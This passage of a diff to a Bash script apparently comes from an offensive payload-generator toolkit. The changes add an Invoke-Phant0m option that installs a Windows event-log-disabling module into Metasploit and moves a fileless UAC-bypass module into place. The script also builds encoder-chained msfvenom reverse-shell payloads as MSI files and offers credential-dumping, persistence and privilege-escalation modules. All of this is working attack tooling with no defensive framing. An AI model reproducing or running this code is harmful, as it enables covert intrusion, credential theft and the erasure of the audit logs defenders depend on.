 
   else
 
@@ -1478,6 +1679,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1506,6 +1708,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1527,6 +1730,7 @@ rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.exe > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -1651,6 +1855,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -1663,7 +1868,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.exe on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -1695,10 +1900,46 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       sed -i "s|N4m|$N4m.exe|g" enigma_fileless_uac_bypass.rb
       # reload metasploit database
       echo "[☠] copy post-module to msf db!"
-      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
       echo "[☠] reloading -> Metasploit database!"
       xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
       cd $IPATH
+
+
+  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+
 
   else
 
@@ -1739,6 +1980,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1767,6 +2009,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1789,6 +2032,7 @@ rm $IPATH/templates/final.c > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.exe > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -1895,6 +2139,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -1939,6 +2184,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1966,6 +2212,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2025,7 +2272,7 @@ cat << !
 
 # use metasploit to build shellcode
 # xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f msi > $IPATH/output/$N4m.msi"
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f msi-nouac > $IPATH/output/$N4m.msi"
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/countdown -i 8 -f raw | msfvenom --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom --platform windows -e x86/shikata_ga_nai -i 9 -f msi-nouac > $IPATH/output/$N4m.msi"
 
 
 echo ""
@@ -2066,6 +2313,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -2079,7 +2327,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
 
       N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.msi needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start trigger.bat on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -2112,10 +2360,46 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       sed -i "s|N4m|$N4m2|g" enigma_fileless_uac_bypass.rb
       # reload metasploit database
       echo "[☠] copy post-module to msf db!"
-      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
       echo "[☠] reloading -> Metasploit database!"
       xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
       cd $IPATH
+
+
+  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+
 
   else
 
@@ -2156,6 +2440,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2184,6 +2469,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2207,6 +2493,7 @@ rm $ApAcHe/$N4m > /dev/null 2>&1
 rm $ApAcHe/$N4m2 > /dev/null 2>&1
 rm $ApAcHe/trigger.bat > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 }
@@ -2245,7 +2532,7 @@ cat << !
 !
 
 # use metasploit to build shellcode
-# sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows EXITFUNC=thread -f c | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- > $IPATH/output/chars.raw
+# sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows EXITFUNC=thread -f c | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- > $IPATH/output/chars.raw
 
 cd $IPATH/aux
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "python Invoke-Shellcode.py --lhost $lhost --lport $lport --payload $paylo" > /dev/null 2>&1
@@ -2321,6 +2608,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -2333,7 +2621,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -2365,10 +2653,46 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       sed -i "s|N4m|$N4m.bat|g" enigma_fileless_uac_bypass.rb
       # reload metasploit database
       echo "[☠] copy post-module to msf db!"
-      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
       echo "[☠] reloading -> Metasploit database!"
       xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
       cd $IPATH
+
+
+  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+
 
   else
 
@@ -2410,6 +2734,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2438,6 +2763,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2462,6 +2788,7 @@ rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.bat > /dev/null 2>&1
 rm $IPATH/bin/sedding.raw > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -2584,6 +2911,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -2596,7 +2924,47 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 
-      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 290) > /dev/null 2>&1
+      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1
+
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
+
+
+
+
       cd $IPATH/output
       cp $N4m.hta $ApAcHe/$N4m.hta > /dev/null 2>&1
       cp index.html $ApAcHe/index.html > /dev/null 2>&1
@@ -2626,6 +2994,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2654,6 +3023,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2675,6 +3045,7 @@ rm $IPATH/output/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.hta > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/missing_plugin.png > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -2784,6 +3155,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -2796,7 +3168,43 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 
-      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 350 --height 290) > /dev/null 2>&1
+      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 350 --height 320) > /dev/null 2>&1
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
+
 
       # edit files nedded
       cd $IPATH/templates/phishing
@@ -2832,6 +3240,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2860,6 +3269,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2879,6 +3289,7 @@ rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.ps1 > /dev/null 2>&1
 rm $ApAcHe/trigger.bat > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -2977,6 +3388,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -2989,7 +3401,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -3021,10 +3433,45 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       sed -i "s|N4m|$N4m.bat|g" enigma_fileless_uac_bypass.rb
       # reload metasploit database
       echo "[☠] copy post-module to msf db!"
-      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
       echo "[☠] reloading -> Metasploit database!"
       xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
       cd $IPATH
+
+  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
